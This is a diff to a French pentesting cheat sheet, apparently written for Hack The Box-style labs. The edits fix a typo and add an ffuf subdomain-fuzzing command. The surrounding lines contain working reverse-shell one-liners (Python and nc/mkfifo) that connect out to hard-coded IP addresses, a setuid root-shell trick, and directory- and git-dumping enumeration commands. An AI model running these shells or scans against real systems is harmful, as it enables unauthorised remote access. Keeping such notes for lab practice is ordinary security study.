@@ -14,7 +14,7 @@
         - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
         - [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
-	- Spawn a meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
+	- Spawn un meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
 	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1234 >/tmp/f`
 
@@ -150,7 +150,7 @@ john zip.hashes` ou `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_
 - Dirb --> `dirb http://mypage.com`
 	- Chercher des extensions --> `dirb http://172.16.28.230/ -X .txt .php`
 - Ffuf --> `ffuf -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt -ac -v -u http://172.16.28.230/FUZZ -recursion -r`
-  	- Sous-domaines --> `ffuf -w /usr/share/wordlists/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 `
+  	- Sous-domaines --> `ffuf -w /usr/share/wordlists/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 ` ou `ffuf -c -u http://linkvortex.htb -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.linkvortex.htb" -fc 301`
 
 - Analyse repo [GIT-DUMPER](https://github.com/arthaud/git-dumper) --> `gitdumper.sh http://shop.trickster.htb/.git/ dest-dir .`
 
